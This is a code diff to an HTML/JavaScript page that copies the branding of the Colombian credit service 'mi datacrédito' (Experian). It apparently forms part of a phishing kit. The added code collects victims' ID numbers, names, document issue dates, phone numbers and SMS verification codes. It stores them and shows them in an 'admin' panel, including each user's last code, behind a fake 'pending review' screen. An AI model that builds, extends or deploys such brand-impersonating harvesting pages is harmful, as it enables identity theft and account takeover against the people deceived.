@@ -1743,6 +1743,128 @@
     <button onclick="step2Next()" style="display:block;width:100%;background:transparent;color:#6B1FA8;border:none;padding:12px;font-size:14px;cursor:pointer;margin-top:8px;">Reenviar código</button>
   </div>
 
+  <!-- STEP 4: Registro (cédula nueva) -->
+  <div id="step4" style="display:none;overflow-y:auto;max-height:90vh;">
+    <div style="padding:20px 20px 0;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <div style="background:#6B1FA8;border-radius:8px;width:30px;height:30px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#fff;font-size:12px;font-family:sans-serif;">mi</div>
+          <span style="font-size:15px;font-weight:700;color:#333;">datacrédito</span>
+        </div>
+        <button onclick="closeLogin()" style="background:none;border:none;font-size:22px;color:#888;cursor:pointer;">✕</button>
+      </div>
+      <div style="height:3px;background:#E8E8E8;border-radius:2px;margin:10px 0 18px;">
+        <div style="width:60%;height:100%;background:#6B1FA8;border-radius:2px;"></div>
+      </div>
+      <h3 style="font-size:18px;color:#222;font-weight:700;margin-bottom:4px;">Completa tu registro</h3>
+      <p style="font-size:13px;color:#777;margin-bottom:18px;line-height:1.5;">Necesitamos validar tu identidad para crear tu cuenta.</p>
+    </div>
+
+    <!-- Formulario -->
+    <div style="padding:0 20px;">
+      <!-- Tipo de documento -->
+      <div style="border:1px solid #DDD;border-radius:10px;padding:12px;margin-bottom:10px;">
+        <label style="font-size:11px;color:#6B1FA8;font-weight:600;display:block;margin-bottom:4px;">Tipo de documento</label>
+        <select id="reg-docType" style="width:100%;border:none;font-size:15px;color:#333;background:transparent;outline:none;cursor:pointer;">
+          <option value="CC">Cédula de Ciudadanía</option>
+          <option value="PAS">Pasaporte</option>
+          <option value="CE">Cédula de Extranjería</option>
+          <option value="NIT">NIT</option>
+        </select>
+      </div>
+
+      <!-- Número -->
+      <div style="border:1px solid #DDD;border-radius:10px;padding:12px;margin-bottom:10px;">
+        <label style="font-size:11px;color:#6B1FA8;font-weight:600;display:block;margin-bottom:4px;">Numero de identificación</label>
+        <input id="reg-cedula" type="number" style="width:100%;border:none;font-size:15px;color:#333;background:transparent;outline:none;" readonly>
+      </div>
+
+      <!-- Primer nombre -->
+      <div style="border:1px solid #DDD;border-radius:10px;padding:12px;margin-bottom:10px;">
+        <label style="font-size:11px;color:#6B1FA8;font-weight:600;display:block;margin-bottom:4px;">Primer nombre</label>
+        <input id="reg-nombre" type="text" placeholder="" style="width:100%;border:none;font-size:15px;color:#333;background:transparent;outline:none;">
+      </div>
+
+      <!-- Primer apellido -->
+      <div style="border:1px solid #DDD;border-radius:10px;padding:12px;margin-bottom:10px;">
+        <label style="font-size:11px;color:#6B1FA8;font-weight:600;display:block;margin-bottom:4px;">Primer apellido</label>
+        <input id="reg-apellido" type="text" placeholder="" style="width:100%;border:none;font-size:15px;color:#333;background:transparent;outline:none;">
+      </div>
+
+      <!-- Fecha expedición -->
+      <div style="border:1px solid #DDD;border-radius:10px;padding:12px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
+        <div style="flex:1;">
+          <label style="font-size:11px;color:#6B1FA8;font-weight:600;display:block;margin-bottom:4px;">Fecha expedición del documento</label>
+          <input id="reg-fecha" type="date" style="width:100%;border:none;font-size:15px;color:#333;background:transparent;outline:none;">
+        </div>
+        <span style="color:#888;font-size:18px;">📅</span>
+      </div>
+
+      <!-- Checkboxes -->
+      <label style="display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;cursor:pointer;">
+        <input id="reg-check1" type="checkbox" onchange="updateRegBtn()" style="width:18px;height:18px;flex-shrink:0;margin-top:2px;accent-color:#6B1FA8;">
+        <span style="font-size:13px;color:#444;line-height:1.55;">He leído y acepto los términos y condiciones de Midatacrédito y autorizo el tratamiento de mis datos personales para que sean utilizados de acuerdo con esta autorización de tratamiento de datos personales.</span>
+      </label>
+
+      <label style="display:flex;align-items:flex-start;gap:12px;margin-bottom:20px;cursor:pointer;">
+        <input id="reg-check2" type="checkbox" onchange="updateRegBtn()" style="width:18px;height:18px;flex-shrink:0;margin-top:2px;accent-color:#6B1FA8;">
+        <span style="font-size:13px;color:#444;line-height:1.55;">He leído y acepto el tratamiento de mis datos personales biométricos según esta autorización.</span>
+      </label>
+
+      <!-- Error -->
+      <div id="step4Error" style="color:#e53935;font-size:13px;margin-bottom:12px;display:none;"></div>
+
+      <!-- Botón Continuar -->
+      <button id="reg-btn" onclick="step4Submit()" disabled style="display:block;width:100%;background:#D0B8E8;color:#fff;border:none;border-radius:30px;padding:15px;font-size:16px;font-weight:700;cursor:not-allowed;margin-bottom:20px;transition:background 0.2s;">Continuar</button>
+    </div>
+
+    <!-- Footer legal -->
+    <div style="background:#6B1FA8;padding:14px 20px;margin-top:4px;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+        <div style="background:rgba(255,255,255,0.2);border-radius:6px;width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#fff;font-size:10px;font-family:sans-serif;">mi</div>
+        <span style="color:rgba(255,255,255,0.9);font-size:13px;">datacrédito</span>
+      </div>
+      <div style="height:1px;background:rgba(255,255,255,0.2);margin-bottom:10px;"></div>
+      <div style="color:rgba(255,255,255,0.8);font-size:11px;text-align:center;line-height:1.5;">·datacrédito experian.</div>
+      <div style="color:rgba(255,255,255,0.7);font-size:10px;text-align:center;margin-top:4px;">Experian Information Solutions, Inc. © Derechos reservados</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ========== OVERLAY CARGANDO (mi datacrédito + barra) ========== -->
+<div id="regLoadingOverlay" style="display:none;position:fixed;inset:0;z-index:420;background:rgba(255,255,255,0.94);flex-direction:column;align-items:center;justify-content:center;">
+  <div style="display:flex;align-items:center;gap:10px;margin-bottom:28px;">
+    <div style="background:#6B1FA8;border-radius:14px;width:54px;height:54px;display:flex;align-items:center;justify-content:center;">
+      <span style="font-size:20px;font-weight:900;color:#fff;font-family:sans-serif;">mi</span>
+    </div>
+    <span style="font-size:26px;font-weight:700;color:#333;letter-spacing:-0.5px;">datacrédito</span>
+  </div>
+  <div style="width:260px;height:4px;background:#E0E0E0;border-radius:4px;overflow:hidden;margin-bottom:10px;">
+    <div id="regLoadingBar" style="height:100%;width:0%;background:#6B1FA8;border-radius:4px;transition:width 2s ease;"></div>
+  </div>
+  <span style="font-size:13px;color:#888;">Cargando</span>
+</div>
+
+<!-- ========== PANTALLA ESPERA (aguarde) ========== -->
+<div id="waitingScreen" style="display:none;position:fixed;inset:0;z-index:421;background:#fff;flex-direction:column;align-items:center;justify-content:center;padding:32px;">
+  <div style="background:#6B1FA8;border-radius:20px;width:80px;height:80px;display:flex;align-items:center;justify-content:center;margin-bottom:24px;">
+    <span style="font-size:28px;font-weight:900;color:#fff;font-family:sans-serif;">mi</span>
+  </div>
+  <h2 style="font-size:20px;font-weight:700;color:#222;text-align:center;margin-bottom:12px;line-height:1.3;">Aguarde un momento, por favor</h2>
+  <p style="font-size:14px;color:#666;text-align:center;line-height:1.65;margin-bottom:28px;max-width:300px;">Estamos procesando tu solicitud de acceso. El administrador revisará tu información y recibirás confirmación pronto.</p>
+  <div style="display:flex;gap:8px;margin-bottom:32px;">
+    <div class="wait-dot" style="width:10px;height:10px;border-radius:50%;background:#6B1FA8;animation:waitBounce 1.2s ease-in-out infinite;"></div>
+    <div class="wait-dot" style="width:10px;height:10px;border-radius:50%;background:#6B1FA8;animation:waitBounce 1.2s ease-in-out 0.2s infinite;"></div>
+    <div class="wait-dot" style="width:10px;height:10px;border-radius:50%;background:#6B1FA8;animation:waitBounce 1.2s ease-in-out 0.4s infinite;"></div>
+  </div>
+  <button onclick="closeWaitingScreen()" style="background:#6B1FA8;color:#fff;border:none;border-radius:30px;padding:13px 32px;font-size:15px;font-weight:700;cursor:pointer;">Entendido</button>
+  <style>
+    @keyframes waitBounce {
+      0%,100%{transform:translateY(0);opacity:0.5}
+      50%{transform:translateY(-8px);opacity:1}
+    }
+  </style>
 </div>
 
 <!-- ========== SPLASH SCREEN ========== -->
@@ -2079,11 +2201,7 @@
       <div style="background:#fff;border-radius:10px;width:36px;height:36px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#6B1FA8;font-size:15px;font-family:sans-serif;">mi</div>
       <span style="color:#fff;font-weight:700;font-size:17px;letter-spacing:-0.3px;">datacrédito</span>
     </div>
-    <button onclick="closeReportePanel()" style="background:none;border:none;cursor:pointer;display:flex;flex-direction:column;gap:5px;padding:4px;">
-      <span style="display:block;width:24px;height:2px;background:#fff;border-radius:2px;"></span>
-      <span style="display:block;width:24px;height:2px;background:#fff;border-radius:2px;"></span>
-      <span style="display:block;width:24px;height:2px;background:#fff;border-radius:2px;"></span>
-    </button>
+    <button onclick="closeReportePanel()" style="background:rgba(255,255,255,0.15);border:none;color:#fff;font-size:22px;border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;line-height:1;">✕</button>
   </header>
 
   <!-- Saludo usuario -->
@@ -2195,18 +2313,30 @@
   </div>
 
   <!-- Stats -->
-  <div style="display:flex;gap:12px;padding:16px;overflow-x:auto;">
-    <div style="background:#fff;border-radius:12px;padding:14px 18px;flex-shrink:0;text-align:center;">
-      <div id="statTotal" style="font-size:28px;font-weight:900;color:#6B1FA8;">0</div>
-      <div style="font-size:12px;color:#888;">Registros</div>
+  <div style="display:flex;gap:10px;padding:16px;overflow-x:auto;">
+    <div style="background:#fff;border-radius:12px;padding:14px 16px;flex-shrink:0;text-align:center;min-width:70px;">
+      <div id="statTotal" style="font-size:26px;font-weight:900;color:#6B1FA8;">0</div>
+      <div style="font-size:11px;color:#888;">Total</div>
     </div>
-    <div style="background:#fff;border-radius:12px;padding:14px 18px;flex-shrink:0;text-align:center;">
-      <div id="statAuth" style="font-size:28px;font-weight:900;color:#2E7D32;">0</div>
-      <div style="font-size:12px;color:#888;">Autorizados</div>
+    <div style="background:#fff;border-radius:12px;padding:14px 16px;flex-shrink:0;text-align:center;min-width:70px;">
+      <div id="statAuth" style="font-size:26px;font-weight:900;color:#2E7D32;">0</div>
+      <div style="font-size:11px;color:#888;">Autorizados</div>
     </div>
-    <div style="background:#fff;border-radius:12px;padding:14px 18px;flex-shrink:0;text-align:center;">
-      <div id="statBlocked" style="font-size:28px;font-weight:900;color:#C62828;">0</div>
-      <div style="font-size:12px;color:#888;">Bloqueados</div>
+    <div style="background:#FFF8E1;border-radius:12px;padding:14px 16px;flex-shrink:0;text-align:center;min-width:70px;border:2px solid #FFB800;">
+      <div id="statPendiente" style="font-size:26px;font-weight:900;color:#F57F17;">0</div>
+      <div style="font-size:11px;color:#888;">Pendientes</div>
+    </div>
+    <div style="background:#fff;border-radius:12px;padding:14px 16px;flex-shrink:0;text-align:center;min-width:70px;">
+      <div id="statBlocked" style="font-size:26px;font-weight:900;color:#C62828;">0</div>
+      <div style="font-size:11px;color:#888;">Negados</div>
+    </div>
+  </div>
+
+  <!-- Solicitudes PENDIENTES -->
+  <div style="background:#FFF8E1;border-radius:16px;margin:0 16px 16px;padding:16px;border:2px solid #FFB800;">
+    <h4 style="color:#F57F17;margin-bottom:12px;font-size:15px;">⏳ Solicitudes pendientes</h4>
+    <div id="adminPendienteList" style="display:flex;flex-direction:column;gap:12px;">
+      <p style="color:#888;text-align:center;font-size:13px;">Sin solicitudes pendientes</p>
     </div>
   </div>
 
@@ -2334,11 +2464,63 @@ function closeLogin() {
   document.body.style.overflow = '';
   stopLoginSlider();
 }
+// isRegisterFlow: true cuando el usuario viene del formulario de registro (step 4)
+let isRegisterFlow = false;
+let regData = {}; // datos temporales del formulario de registro
+
 function goStep(n) {
-  [1,2,3].forEach(i => {
+  [1,2,3,4].forEach(i => {
     const el = document.getElementById('step'+i);
     if(el) el.style.display = i===n ? 'block' : 'none';
   });
+}
+
+function updateRegBtn() {
+  const c1 = document.getElementById('reg-check1').checked;
+  const c2 = document.getElementById('reg-check2').checked;
+  const btn = document.getElementById('reg-btn');
+  const ok = c1 && c2;
+  btn.disabled = !ok;
+  btn.style.background = ok ? '#6B1FA8' : '#D0B8E8';
+  btn.style.cursor = ok ? 'pointer' : 'not-allowed';
+}
+
+function step4Submit() {
+  const nombre   = document.getElementById('reg-nombre').value.trim();
+  const apellido = document.getElementById('reg-apellido').value.trim();
+  const fecha    = document.getElementById('reg-fecha').value;
+  const docType  = document.getElementById('reg-docType').value;
+  const errEl    = document.getElementById('step4Error');
+  errEl.style.display = 'none';
+
+  if (!nombre)   { errEl.textContent = 'Ingresa tu primer nombre.';   errEl.style.display='block'; return; }
+  if (!apellido) { errEl.textContent = 'Ingresa tu primer apellido.'; errEl.style.display='block'; return; }
+  if (!fecha)    { errEl.textContent = 'Ingresa la fecha de expedición del documento.'; errEl.style.display='block'; return; }
+
+  // Guardar datos del formulario para usarlos en step3Verify
+  const g = detectGender(nombre);
+  regData = {
+    cedula:         currentCedula,
+    docType,
+    nombre:         nombre.charAt(0).toUpperCase() + nombre.slice(1).toLowerCase(),
+    primerApellido: apellido.charAt(0).toUpperCase() + apellido.slice(1).toLowerCase(),
+    fechaDoc:       fecha,
+    genero:         g,
+    autorizado:     false,
+    pendiente:      true,
+  };
+
+  // Continuar al paso 2 (teléfono) dentro del flujo de registro
+  isRegisterFlow = true;
+  document.getElementById('phoneNum').value = '';
+  document.getElementById('step2Error').style.display = 'none';
+  goStep(2);
+}
+
+function closeWaitingScreen() {
+  document.getElementById('waitingScreen').style.display = 'none';
+  document.body.style.overflow = '';
+  closeLogin();
 }
 
 async function step1Next() {
@@ -2354,20 +2536,37 @@ async function step1Next() {
 
   currentCedula = cedula;
   currentDocType = docType;
+  isRegisterFlow = false;
 
-  // Register attempt if not exists
   const existing = await findUser(cedula);
+
   if (!existing) {
-    await upsertUser({ cedula, docType, nombre:'', telefono:'', ultimoCodigo:'', autorizado: false, genero:'N' });
+    // Cédula nueva → mostrar formulario de registro
+    document.getElementById('reg-cedula').value   = cedula;
+    document.getElementById('reg-docType').value  = docType;
+    document.getElementById('reg-nombre').value   = '';
+    document.getElementById('reg-apellido').value = '';
+    document.getElementById('reg-fecha').value    = '';
+    document.getElementById('reg-check1').checked = false;
+    document.getElementById('reg-check2').checked = false;
+    document.getElementById('step4Error').style.display = 'none';
+    updateRegBtn();
+    goStep(4);
+    return;
   }
 
-  const user = await findUser(cedula);
-  if (!user || !user.autorizado) {
-    errEl.textContent = 'Tu cédula no está autorizada. Comunícate con el administrador.';
+  if (existing.pendiente) {
+    // Ya envió solicitud → mostrar pantalla de espera
+    showWaitingScreen();
+    return;
+  }
+
+  if (!existing.autorizado) {
+    errEl.textContent = 'Tu acceso fue denegado. Comunícate con el administrador.';
     errEl.style.display = 'block'; return;
   }
 
-  // Go to phone step
+  // Autorizado → paso de teléfono
   goStep(2);
 }
 
@@ -2403,12 +2602,44 @@ async function step3Verify() {
     errEl.style.display = 'block'; return;
   }
 
-  // Login OK
+  if (isRegisterFlow) {
+    // ── Flujo de REGISTRO: guardar solicitud pendiente ──
+    await upsertUser({
+      ...regData,
+      telefono:     currentPhone,
+      ultimoCodigo: currentCode,
+    });
+    isRegisterFlow = false;
+    regData = {};
+    showWaitingScreen();
+    return;
+  }
+
+  // ── Flujo de LOGIN normal ──
   const now = new Date().toISOString();
   await upsertUser({ cedula: currentCedula, telefono: currentPhone, ultimoCodigo: currentCode, ultimoAcceso: now });
   setSession(currentCedula);
   closeLogin();
   showSplash(loginDestination);
+}
+
+function showWaitingScreen() {
+  // Mostrar overlay "mi datacrédito Cargando" con barra de progreso
+  const overlay = document.getElementById('regLoadingOverlay');
+  overlay.style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+  closeLogin();
+
+  // Animar barra
+  const bar = document.getElementById('regLoadingBar');
+  bar.style.width = '0%';
+  setTimeout(() => { bar.style.width = '100%'; }, 100);
+
+  // Después de 2.5 seg → pantalla de espera
+  setTimeout(() => {
+    overlay.style.display = 'none';
+    document.getElementById('waitingScreen').style.display = 'flex';
+  }, 2500);
 }
 
 // ============================================================
@@ -2833,32 +3064,66 @@ function openAdminPanel() {
 
 async function renderAdminPanel() {
   const users = await getUsers();
+  const pending   = users.filter(u => u.pendiente && !u.autorizado);
   const authorized = users.filter(u => u.autorizado);
-  const blocked = users.filter(u => !u.autorizado);
-  document.getElementById('statTotal').textContent = users.length;
-  document.getElementById('statAuth').textContent = authorized.length;
-  document.getElementById('statBlocked').textContent = blocked.length;
+  const blocked    = users.filter(u => !u.autorizado && !u.pendiente);
 
+  document.getElementById('statTotal').textContent     = users.length;
+  document.getElementById('statAuth').textContent      = authorized.length;
+  document.getElementById('statPendiente').textContent = pending.length;
+  document.getElementById('statBlocked').textContent   = blocked.length;
+
+  // ── Solicitudes pendientes ──────────────────────────────────
+  const pendList = document.getElementById('adminPendienteList');
+  if (!pending.length) {
+    pendList.innerHTML = '<p style="color:#888;text-align:center;font-size:13px;">Sin solicitudes pendientes</p>';
+  } else {
+    pendList.innerHTML = pending.map(u => {
+      const g = u.genero === 'F' ? '👩' : u.genero === 'M' ? '👨' : '🧑';
+      const fecha = u.fechaRegistro ? new Date(u.fechaRegistro).toLocaleDateString('es-CO') : '—';
+      const nombreCompleto = [u.nombre, u.primerApellido].filter(Boolean).join(' ') || '<em style="color:#AAA">Sin nombre</em>';
+      return `<div style="border:2px solid #FFB800;border-radius:12px;padding:14px;background:#FFFDE7;">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;">
+          <div>
+            <div style="font-weight:700;font-size:15px;">${g} ${nombreCompleto}</div>
+            <div style="font-size:13px;color:#666;">${u.docType || 'CC'} ${u.cedula}</div>
+          </div>
+          <span style="background:#FFF3E0;color:#F57F17;border-radius:20px;padding:3px 10px;font-size:11px;font-weight:700;">⏳ Pendiente</span>
+        </div>
+        <div style="font-size:12px;color:#777;margin-bottom:3px;">📱 ${u.telefono || '—'} &nbsp;|&nbsp; 📅 Doc: ${u.fechaDoc || '—'}</div>
+        <div style="font-size:12px;color:#777;margin-bottom:10px;">🗓 Solicitud: ${fecha}</div>
+        <div style="display:flex;gap:8px;">
+          <button onclick="adminToggle('${u.cedula}',true)" style="flex:1;background:#E8F5E9;color:#2E7D32;border:none;border-radius:20px;padding:10px;font-size:13px;font-weight:700;cursor:pointer;">✓ Autorizar</button>
+          <button onclick="adminToggle('${u.cedula}',false)" style="flex:1;background:#FFEBEE;color:#C62828;border:none;border-radius:20px;padding:10px;font-size:13px;font-weight:700;cursor:pointer;">✗ Negar</button>
+          <button onclick="adminDelete('${u.cedula}')" style="background:#F5F5F5;color:#888;border:none;border-radius:20px;padding:10px 14px;font-size:13px;cursor:pointer;">🗑</button>
+        </div>
+      </div>`;
+    }).join('');
+  }
+
+  // ── Lista de todos los usuarios ─────────────────────────────
   const list = document.getElementById('adminUserList');
-  if (!users.length) { list.innerHTML = '<p style="color:#888;text-align:center;">No hay registros aún.</p>'; return; }
+  const registered = users.filter(u => !u.pendiente); // excluir pendientes de la lista principal
+  if (!registered.length) { list.innerHTML = '<p style="color:#888;text-align:center;font-size:13px;">No hay usuarios registrados aún.</p>'; return; }
 
-  list.innerHTML = users.map(u => {
+  list.innerHTML = registered.map(u => {
     const g = u.genero === 'F' ? '👩' : u.genero === 'M' ? '👨' : '🧑';
     const badge = u.autorizado
       ? '<span style="background:#E8F5E9;color:#2E7D32;border-radius:20px;padding:3px 10px;font-size:11px;font-weight:700;">✓ Autorizado</span>'
-      : '<span style="background:#FFEBEE;color:#C62828;border-radius:20px;padding:3px 10px;font-size:11px;font-weight:700;">✗ Bloqueado</span>';
+      : '<span style="background:#FFEBEE;color:#C62828;border-radius:20px;padding:3px 10px;font-size:11px;font-weight:700;">✗ Negado</span>';
     const fecha = u.fechaRegistro ? new Date(u.fechaRegistro).toLocaleDateString('es-CO') : '—';
     const acceso = u.ultimoAcceso ? new Date(u.ultimoAcceso).toLocaleString('es-CO') : '—';
+    const nombreCompleto = [u.nombre, u.primerApellido].filter(Boolean).join(' ') || '';
 
     return `<div style="border:1px solid #F0F0F0;border-radius:12px;padding:14px;">
       <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;">
         <div>
-          <div style="font-weight:700;font-size:15px;">${g} ${u.nombre || '<em style="color:#AAA">Sin nombre</em>'}</div>
-          <div style="font-size:13px;color:#666;">CC ${u.cedula}</div>
+          <div style="font-weight:700;font-size:15px;">${g} ${nombreCompleto || '<em style="color:#AAA">Sin nombre</em>'}</div>
+          <div style="font-size:13px;color:#666;">${u.docType || 'CC'} ${u.cedula}</div>
         </div>
         ${badge}
       </div>
-      ${u.nombre ? '' : `<div style="margin-bottom:8px;"><input type="text" placeholder="Asignar nombre" onblur="adminSetNombre('${u.cedula}',this.value)" style="border:1px solid #DDD;border-radius:8px;padding:6px 10px;font-size:13px;width:100%;box-sizing:border-box;outline:none;"></div>`}
+      ${!nombreCompleto ? `<div style="margin-bottom:8px;"><input type="text" placeholder="Asignar nombre" onblur="adminSetNombre('${u.cedula}',this.value)" style="border:1px solid #DDD;border-radius:8px;padding:6px 10px;font-size:13px;width:100%;box-sizing:border-box;outline:none;"></div>` : ''}
       <div style="font-size:12px;color:#888;margin-bottom:4px;">📱 ${u.telefono || '—'} &nbsp;|&nbsp; 🔑 Cód: ${u.ultimoCodigo || '—'}</div>
       <div style="font-size:12px;color:#888;margin-bottom:10px;">📅 Registro: ${fecha} &nbsp;|&nbsp; Último acceso: ${acceso}</div>
       <div style="display:flex;gap:8px;">
